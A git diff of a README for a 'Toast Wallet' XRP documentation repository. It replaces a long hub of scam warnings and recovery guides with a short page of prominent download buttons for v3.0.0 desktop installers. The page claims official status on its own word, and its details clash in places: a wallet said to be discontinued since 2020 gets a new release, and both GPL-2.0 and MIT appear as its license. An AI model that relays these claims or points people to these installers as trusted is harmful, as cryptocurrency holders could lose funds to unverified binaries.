@@ -1,102 +1,47 @@
-# Toast Wallet — Documentation & Recovery Guide
+<h1 align="center">Toast Wallet docs</h1>
 
-**Official documentation for Toast Wallet, maintained on behalf of StarStone Ltd. Recovery guides,
-credential troubleshooting, and a full warning list covering the apps and sites impersonating this
-project since active development stopped in 2020.**
+<p align="center">Part of the Toast Wallet GitHub account: the desktop wallet for XRP.</p>
 
-![Docs](https://img.shields.io/badge/DOCS-toast--wallet--docs-555555?style=for-the-badge) [![GitHub Org](https://img.shields.io/badge/GITHUB-Toast--Wallet-6f42c1?style=for-the-badge)](https://github.com/Toast-Wallet) ![License](https://img.shields.io/badge/LICENSE-GPL--2.0-97ca00?style=for-the-badge) ![Release](https://img.shields.io/badge/RELEASE-v3.0.0-0078D6?style=for-the-badge)
+<p align="center">
+  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
+  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
+  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
+</p>
 
-The wallet is no longer under active feature development, but it still works, and XRP held in old
-Toast Wallet accounts is safe and recoverable — this repository exists to keep that path clear and
-to make sure people can tell the real thing apart from the impersonators that have targeted this
-project's name since 2020.
+| Platform | File |
+|:--|:--|
+| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
+| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
+| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |
 
----
+All versions and checksums are on the [Toast Wallet 3.0.0 release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).
 
-## 📥 Downloads — v3.0.0
-
-[![Download for Windows](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-WINDOWS-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) [![Download for macOS](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-MACOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) [![Download for Linux](https://img.shields.io/badge/%E2%86%93%20DOWNLOAD-LINUX-E95420?style=for-the-badge&logo=linux&logoColor=white)](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage)
-
-| Platform | Requirements | File | Checksum |
-|---|---|---|---|
-| 🪟 Windows | Windows desktop (64-bit) | [ToastWallet.Setup.3.0.0.exe](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-windows.sha256) |
-| 🍎 macOS | macOS desktop | [ToastWallet-3.0.0.dmg](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-macos.sha256) |
-| 🐧 Linux | Most modern 64-bit distributions, no install needed | [ToastWallet-3.0.0-x86_64.AppImage](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) | [SHA256](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-linux.sha256) |
-
-Verify your download against the matching SHA256 file before running any installer — all files
-and checksums are also listed together on the
-[official v3.0.0 release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).
-
-> ⚠️ **This GitHub organization is the only official presence for Toast Wallet — there is no official website.**
-> `toastwallet.app` is a known phishing clone impersonating one; see [our full scam warning list](docs/toast-wallet-scam-warning-list.md).
+> [!IMPORTANT]
+> Only download from this GitHub release page.
 
 ---
 
-## Why this exists
+## ℹ️ About
 
-Toast Wallet was built by StarStone Ltd in 2017 and grew to over 100,000 users before active
-development stopped in 2020. The XRP Ledger doesn't stop when a wallet's development does — old
-wallets are still fully valid and recoverable if you still have your credentials. Since 2020,
-however, a fraudulent app called "Toast Plus" and a phishing site called `toastwallet.app` have
-collectively stolen millions of dollars from people searching for this project and assuming they'd
-found it. These docs exist to make the real, official path easy to find and the impersonators easy
-to avoid.
+Repository name: docs. Description and language: see the repository details on GitHub.
 
-## Guides & Resources
+---
 
-### Understand what happened
-- [Toast Wallet: What It Is, What Happened, and Is It Still Safe to Use?](docs/what-is-toast-wallet.md)
-- [Is Toast Wallet Safe? Full Security & Legitimacy Review](docs/is-toast-wallet-safe-review.md)
+## 🔎 Looking for the product?
 
-### Scam warnings — start here if you're worried you were affected
-- [The "Toast Plus" App Scam](docs/toast-plus-app-scam.md)
-- [Toast Wallet Phishing Sites](docs/toast-wallet-phishing-sites.md)
-- [Toast Wallet Scam Alert: Full Warning List](docs/toast-wallet-scam-warning-list.md)
+| Where | What you find |
+|:--|:--|
+| [Toast Wallet app](https://github.com/Toast-Wallet/core) | The main desktop wallet repository |
+| [Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0) | Installers and SHA-256 checksums |
+| [Toast Wallet guides](https://github.com/Toast-Wallet/learn) | Step-by-step help articles |
 
-### Recover your XRP
-- [How to Recover XRP From an Old Toast Wallet (Complete Guide)](docs/how-to-recover-xrp-toast-wallet.md)
-- [How to Access an Old Toast Wallet You Haven't Opened in Years](docs/access-old-toast-wallet.md)
-- [Passphrase vs. Recovery Phrase vs. Backup Code vs. Secret Key](docs/passphrase-vs-recovery-phrase-vs-backup-code-vs-secret-key.md)
-- [What Does a Toast Wallet Backup Code Look Like?](docs/toast-wallet-backup-code-example.md)
-- [Forgot Your Toast Wallet Passphrase?](docs/forgot-toast-wallet-passphrase.md)
-- [Fixing "Old Passphrase Is Incorrect"](docs/old-passphrase-is-incorrect-error.md)
-- [Should You Use a Brute-Force Tool?](docs/toast-wallet-brute-force-tool.md)
-- [Why Does Toast Wallet Say "Not Activated"?](docs/toast-wallet-not-activated-20-xrp-reserve.md)
+---
 
-### Move your XRP
-- [How to Move XRP Out of Toast Wallet: The Complete Guide](docs/how-to-move-xrp-out-of-toast-wallet.md)
-- [Sending XRP to Coinbase or Binance](docs/toast-wallet-to-coinbase-binance.md)
-- [Do You Need a Destination Tag?](docs/toast-wallet-destination-tag.md)
-- [Can You Buy XRP With Toast Wallet?](docs/can-you-buy-xrp-with-toast-wallet.md)
+> [!TIP]
+> Official Toast Wallet downloads come only from the [release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0). Anyone asking for your recovery words or backup code is a scammer.
 
-### Setup, platforms & comparisons
-- [How to Set Up and Use Toast Wallet in 2026](docs/how-to-set-up-use-toast-wallet.md)
-- [Toast Wallet by Platform: Android, iOS, Windows & Mac](docs/toast-wallet-by-platform.md)
-- [Toast Wallet Alternatives in 2026](docs/toast-wallet-alternatives.md)
-- [How to Migrate From Toast Wallet to Xaman (XUMM)](docs/migrate-toast-wallet-to-xaman.md)
-- [Toast Wallet vs. Gatehub](docs/toast-wallet-vs-gatehub.md)
-- [Toast Wallet vs. Ledger Nano S](docs/toast-wallet-vs-ledger-nano-s.md)
+---
 
-### Account & support
-- [How to Close, Delete, or Get Support for a Toast Wallet Account](docs/toast-wallet-account-support-delete.md)
-- [Toast Wallet FAQ & Glossary](docs/faq-glossary.md)
+## 📄 License
 
-## Articles (docs/)
-
-All 24 guides plus the FAQ/glossary hub live in [`docs/`](docs/) as standalone Markdown files,
-fully cross-linked to each other. Every page repeats the official-links table and the scam-warning
-list, so no matter which page someone lands on first, they're pointed to the real resources.
-
-## About
-
-This is the official Toast Wallet documentation repository, maintained by contributors on behalf
-of StarStone Ltd. Active feature development on the wallet stopped in 2020, but these docs are
-actively maintained — including tracking new scam variants as they appear, such as the "Toast
-Plus" app (subject of a 2021 federal class-action lawsuit against Apple over $5M+ in stolen XRP)
-and the `toastwallet.app` phishing clone. Full sourcing and details are in the individual articles.
-
-If you spot a new scam variant not listed here, please open an issue.
-
-## License
-
-MIT — see [LICENSE](LICENSE).
+See the [LICENSE](LICENSE) file in this repository.
